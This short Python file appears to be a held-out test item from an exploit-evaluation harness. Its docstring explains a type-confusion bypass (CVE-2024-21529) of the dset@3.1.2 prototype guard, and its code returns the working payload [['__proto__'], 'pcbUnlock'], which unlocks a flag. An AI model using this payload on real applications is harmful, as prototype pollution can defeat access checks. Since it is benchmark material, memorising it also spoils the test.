#!/usr/bin/env python3
"""[HELD-OUT] CVE-2024-21529 residual exploit -- the incomplete-fix bypass of dset@3.1.2's string guard.

The dset() key-loop guard on V1 (dset@3.1.2) throws no error but BREAKS the loop when
`k === '__proto__' || k === 'constructor' || k === 'prototype'`, a STRICT `===` comparison against the
STRINGS, with `k = keys[i++]` (NO type coercion). That check only ever fires for a key whose type is
already string. Supplying the path as an ARRAY whose segment is ITSELF an array --
`[["__proto__"], "pcbUnlock"]` -- makes the dangerous key the array `["__proto__"]`, and
`["__proto__"] === "__proto__"` is FALSE, so the guard passes it through (type confusion, CWE-843). Then
dset() dereferences the key with `t[k]`, which coerces the array to the string `"__proto__"`, so the
walk steps onto `Object.prototype` and writes `pcbUnlock` onto it -- GLOBAL prototype pollution. The
benign default-deny gate sees a fresh `({})` now inherit `pcbUnlock` and releases ${PCB_FLAG}. This is
CVE-2024-21529: the guard compared the raw key without coercing its type.

On V2 (dset@3.1.4, the CVE-2024-21529 fix) the key-loop coerces `k = ''+keys[i++]` BEFORE the guard, so
`["__proto__"]` becomes the string `"__proto__"` and is caught by the guard (break). BLOCKED (negative
control).
"""


def candidate():
    # `spec` is JSON handed to the harness: an ARRAY dset path whose first segment is itself an array
    # `["__proto__"]` (a non-string key of the dangerous name -> defeats the strict `===` guard).
    return {
        "spec": [["__proto__"], "pcbUnlock"],
        "probe_id": "residual-cve-2024-21529-array-key-type-confusion",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
